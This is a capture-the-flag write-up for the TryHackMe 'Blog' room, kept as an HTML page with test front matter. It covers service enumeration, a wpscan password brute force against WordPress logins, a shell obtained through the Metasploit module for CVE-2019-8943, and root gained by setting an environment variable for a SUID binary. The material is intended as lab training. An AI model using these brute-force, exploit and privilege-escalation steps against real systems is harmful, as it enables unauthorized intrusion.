---
title: Test Toc Level - TOC_LEVEL = 6
toc_level: 6
category: Dummy
date: 2019-1-1
---
<!DOCTYPE html>
<html lang="en"><head>
    <meta name="generator" content="HTML Tidy for HTML5 for Linux version 5.7.16">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>Blog @ blog.szymex.pw</title>

    <meta property="og:title" content="Blog @ blog.szymex.pw" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://blog.szymex.pw/thm/blog.html" />
    <meta name="description" content="Nothing exciting">
    <meta name="keywords" content="szymex73, writeup">
    <meta name="author" content="szymex73"><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
<body>
		<div class="container"><header>
	<div class="menu">
		<ul><li><a href="/">/index</a></li><li><a href="/thm/">/thm_writeups</a></li><li><a href="/vulnhub/">/vh_writeups</a></li><li><a href="/ctf/">/ctf_writeups</a></li><li><a href="https://szymex.pw">main_site</a></li></ul>
	</div>
</header><main>
				<p><a href="https://tryhackme.com/room/blog">Room link</a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Billy Joel made a Wordpress blog!
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="objectives">Objectives</h1>

<p>Capture two flags from the box</p>

<h1 id="steps">Steps</h1>

<p>Since the task tells us to add blog.thm to the hosts file let’s do that before we start running anything on it.</p>

<h2 id="enumeration">Enumeration</h2>

<p>As always lets start with a basic portscan</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>Nmap scan report for &lt;IP&gt;
Not shown: 998 closed ports
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We have HTTP and SMB open. Let’s check out the SMB share</p>

<h2 id="smb">SMB</h2>

<p>Let’s scan the machine with smbmap to check for available shares</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>» smbmap.py -H &lt;IP&gt;
[+] Finding open SMB ports....
[+] Guest SMB session established on &lt;IP&gt;...
[+] IP: &lt;IP&gt;:445 Name: blog.thm
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        BillySMB                                                READ, WRITE     Billy's local SMB Share
        IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let’s try to get the files from the BillySMB share as it’s the one that stands out</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>» smbclient //10.10.29.18/BillySMB
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Jul 11 00:52:57 2020
  ..                                  D        0  Tue May 26 19:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
  check-this.png                      N     3082  Tue May 26 20:13:43 2020

                15413192 blocks of size 1024. 9737512 blocks available
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If we download the files we don’t see anything obvious. We can check the jpg with stegsolve</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>» steghide extract -sf Alice-White-Rabbit.jpg
Enter passphrase:
wrote extracted data to "rabbit_hole.txt".
» cat rabbit_hole.txt
You've found yourself in a rabbit hole, friend.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So since this is a rabbit hole let’s check out the HTTP server</p>

<h2 id="http">HTTP</h2>

<p><img src="/images/blog_index.png" alt="http index" />
When we visit the website we see a basic blog. From the room description we know it’s running wordpress.</p>

<p>With that we can scan it using wpscan (I’ll remove the unnecessary info)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>» wpscan --url blog.thm -e u
Interesting Finding(s):

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
 |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We see the site is using WP version 5.0 and it found two users: kwheel and bjoel.</p>

<p>Room tags are hinting at a CVE (CVE-2019-8943) which is a vulnerability allowing for writing files with arbitrary paths thanks to path traversal in <code class="highlighter-rouge">wp_crop_image()</code>.
If we read a bit more about this vuln we can find out that it requires a user account. Thankfully we got the two usernames here so let’s try bruteforcing at least one of them.</p>

<p>Since wpscan has a bruteforce feature we can use that.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>» wpscan --url blog.thm -U kwheel,bjoel -P /opt/wordlists/rockyou.txt --password-attack wp-login -t 64
&lt;RANDOM THINGS&gt;

[SUCCESS] - kwheel / &lt;REDACTED&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>After around two minutes we succesfully gained a user account which we can now use to gain a shell.</p>

<h2 id="cve-2019-8943---metasploit">CVE-2019-8943 - metasploit</h2>

<p>Metasploit contains a module that exploits this vulnerability which we can use to gain a shell.
<code class="highlighter-rouge">exploit/multi/http/wp_crop_rce</code></p>

<h2 id="shell">Shell</h2>
<p>Now that we have a shell we can check for other users on the system</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ ls /home
bjoel
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="privesc">Privesc</h2>

<p>Looking through the system we can’t find a way to get to bjoel but we can see a suid binary that stands out a bit with it being in /usr/sbin</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ /usr/sbin/checker
Not an Admin
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The program prints out a string but doesn’t seem like it does anything else so let’s check it with ghidra.</p>

<p>Ghidra decompiler shows us a program looking something like this (the code below has been cleaned up a bit)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">adminEnv</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"admin"</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">adminEnv</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Not an Admin"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can see this program just gets the “admin” env variable and checks if it’s not null so we can easily bypass this by setting it to anything.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>$ admin=a /usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now we can read the root flag, check out the bjoel’s files and find his hidden user flag in /media</p>

<p><br /><br /><br /><br />
Thanks to:</p>

<ul>
  <li><a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a> for creating this room</li>
  <li>you for reading.<br />
Hope you learned something :)</li>
</ul>


			</main><footer>
	
</footer></div>
	</body>

</html>
